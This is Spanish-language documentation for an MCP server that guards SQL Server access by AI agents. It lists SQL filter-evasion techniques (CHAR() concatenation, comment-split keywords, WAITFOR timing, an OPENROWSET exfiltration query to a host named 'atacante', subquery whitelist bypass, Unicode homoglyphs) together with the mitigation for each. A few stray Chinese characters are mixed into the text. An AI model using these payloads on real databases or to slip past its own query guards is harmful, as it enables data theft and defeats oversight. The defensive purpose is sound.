---
title: Protección contra ataques asistidos por IA
description: Nuevos vectores de ataque que una IA puede usar para evadir controles de seguridad y cómo MCP-Go-MSSQL los mitiga
---

MCP-Go-MSSQL implementa defensas específicas contra técnicas de ataque que una IA puede ejecutar automáticamente, iterando y ajustando queries hasta encontrar debilidades en los controles tradicionales.

## Por qué las IAs son diferentes

A diferencia de un atacante humano, una IA puede:

- Escribir SQL complejo y creativo sin errores de sintaxis
- Iterar automáticamente sobre múltiples variaciones de una query
- Inferir estructura de base de datos a través de mensajes de error
- Encadenar operaciones que individualmente parecen inofensivas
- Probar miles de variaciones por minuto

## Vectores de ataque bloqueados

### 1. Concatenación CHAR()/NCHAR()

Una IA puede construir keywords SQL dinámicamente para evadir detección por regex:

```sql
-- En lugar de "SELECT", usa:
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84) * FROM users

-- Equivale a: SELECT * FROM users
```

**Mitigación**: El servidor detecta patrones de 3 o más concatenaciones CHAR/NCHAR y bloquea la query antes de ejecutarla.

### 2. Comentarios inline para ocultar keywords

Una IA puede ocultar palabras clave SQL dentro de comentarios:

```sql
-- Keyword dividido por comentario:
SEL/*comentario*/ECT * FROM users

-- Keyword oculto al inicio:
/*INS*/ INSERT INTO users VALUES (1)
```

**Mitigación**: `stripAllComments()` elimina todos los comentarios SQL (no solo los del inicio) antes de validar keywords. La validación compara la query original con la version sin comentarios — si un keyword desaparece tras eliminar comentarios, se bloquea.

### 3. Table hints (NOLOCK, READUNCOMMITTED)

Una IA podría intentar脏 reads (lecturas sucias) para evadir controles:

```sql
SELECT * FROM users WITH (NOLOCK)
SELECT * FROM users WITH (READUNCOMMITTED)
SELECT * FROM users WITH (TABLOCK)
```

**Mitigación**: El servidor bloquea todos los table hints危险os que permiten comportamientos no estándar en lecturas.

### 4. WAITFOR DELAY (timing attacks)

Una IA puede inferir existencia de datos midiendo tiempos de respuesta:

```sql
-- Si el usuario existe, el WAITFOR causa un delay
IF (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0
  WAITFOR DELAY '00:00:05'
```

**Mitigación**: El servidor bloquea todas las consultas que contienen `WAITFOR`.

### 5. OPENROWSET / OPENDATASOURCE

Una IA podría intentar exfiltrar datos a servidores externos:

```sql
SELECT * FROM OPENROWSET('SQLNCLI',
  'Server=atacante;Trusted_Connection=yes',
  'SELECT * FROM users')
```

**Mitigación**: Estas funciones están bloqueadas y nunca se ejecutan.

### 5.1. OPENQUERY (no bloqueado)

`OPENQUERY` permite acceder a linked servers configurados en SQL Server. A diferencia de `OPENROWSET`/`OPENDATASOURCE`, **no está bloqueado por código MCP** porque es útil en entornos con múltiples servidores vinculados. Las modificaciones a través de linked servers sí están bloqueadas (son tratadas como cross-database).

### 6. Subqueries para evadir whitelist

Una IA podría acceder a tablas restringidas a través de subqueries:

```sql
-- La tabla "secretos" no está en whitelist,
-- pero esta query la accesible a través de una subquery:
SELECT * FROM (SELECT secret_col FROM secretos) AS x
```

**Mitigación**: `validateSubqueriesForRestrictedTables()` analiza todas las tablas referenciadas dentro de subqueries y verifica que también estén en la whitelist.

### 7. Caracteres Unicode de control bidireccional

Caracteres invisibles pueden invertir la dirección del texto rendering:

```sql
-- \u202E = RTL Override, visualmente parece "SEL* CT"
SELECT\u202E * FROM users

-- Zero-width space divide el keyword:
SEL\u200BECT * FROM users  -- Visualmente: SELECT
```

**Mitigación**: El servidor detecta y rechaza queries con caracteres de control Unicode (U+200B..U+200F, U+202A..U+202E, U+2066..U+2069).

### 8. Homoglyphs Unicode

Caracteres no-Latinos que parecen identical a letras Latinas:

```sql
-- \u0435 = Cyrillic 'е', visualmente indistinguible de 'e'
SEL\u0435CT * FROM users  -- Se rendered como SELECT
```

**Mitigación**: `containsHomoglyphs()` detecta letras no-ASCII que podrían ser homoglyphs. `normalizeToASCII()` translitera Cyrillic/Greek a Latin antes de validar.

## Preservación de strings literales

Todas las validaciones de patrones ignoran contenido dentro de strings SQL:

```sql
-- Esto NO se bloquea (el CHAR concatenation está dentro de un string):
SELECT 'CHAR(83)+CHAR(69)' AS texto FROM users

-- Esto SÍ se bloquea (CHAR concatenation es código real):
CHAR(83)+CHAR(69)+CHAR(76) FROM users
```

La función `stripStringLiterals()` elimina el contenido de `'...'` y `"..."` antes de aplicar pattern matching, evitando falsos positivos.

## Resumen de funciones de seguridad

| Función | Propósito |
|---------|-----------|
| `stripAllComments()` | Elimina todos los comentarios SQL |
| `stripStringLiterals()` | Elimina strings literales antes de pattern matching |
| `containsCharConcatenation()` | Detecta CHAR()/NCHAR() concat |
| `containsDangerousHints()` | Detecta WITH (NOLOCK), etc. |
| `containsWaitfor()` | Detecta WAITFOR DELAY |
| `containsOpenrowset()` | Detecta OPENROWSET/OPENDATASOURCE |
| `containsHomoglyphs()` | Detecta homoglyphs Unicode |
| `normalizeToASCII()` | Transliterate homoglyphs a ASCII |
| `validateQueryUnicodeSafety()` | Orchestrator de validación Unicode |
| `validateSubqueriesForRestrictedTables()` | Valida tablas en subqueries contra whitelist |

## Confirmación de operaciones destructivas

Además de bloquear ataques específicos, el servidor implementa un sistema de confirmación para operaciones DDL que podrían destruir datos u objetos existentes.

### Operaciones que requieren confirmación

Cuando `MSSQL_CONFIRM_DESTRUCTIVE=true` (default), las siguientes operaciones requieren confirmación explícita si el objeto destino ya existe:

| Operación | Objetivo |
|-----------|----------|
| `ALTER VIEW` | Vista existente |
| `DROP TABLE` | Tabla existente |
| `DROP VIEW` | Vista existente |
| `DROP PROCEDURE` | Procedimiento existente |
| `DROP FUNCTION` | Función existente |
| `ALTER TABLE` | Tabla existente |
| `TRUNCATE TABLE` | Tabla existente |

### Cómo funciona

1. La IA envía una query destructiva (ej: `ALTER VIEW dbo.MiVista AS SELECT 1`)
2. El servidor detecta que el objeto existe → retorna error `-32000` con token de confirmación
3. El cliente muestra warning al usuario
4. Usuario llama `confirm_operation { token: "abc123..." }` para ejecutar
5. El token expira en 5 minutos y es de un solo uso

### Modo AUTOPILOT

Para desarrollo con IA que necesita autonomía completa dentro de un scope limitado:

```bash
MSSQL_AUTOPILOT=true
MSSQL_WHITELIST_TABLES=temp_ai,v_temp_ia
```

En modo autopilot:
- No se requiere confirmación para DDL destructivo
- No se valida que las tablas existan (la IA puede crear/modificar sin blocks)
- La whitelist sigue activa: solo objetos en `MSSQL_WHITELIST_TABLES` pueden ser modificados

## Tests

```bash
# Ejecutar suite completa de ataques IA
go test -v -run TestAIAttackVectors ./test/security/...

# Verificación de vulnerabilidades
govulncheck ./...
```

20 casos de prueba cubren: CHAR concatenation, NOLOCK hints, WAITFOR timing attacks, OPENROWSET exfiltración, Unicode bidirectional control characters, y falsos positivos con strings literales.
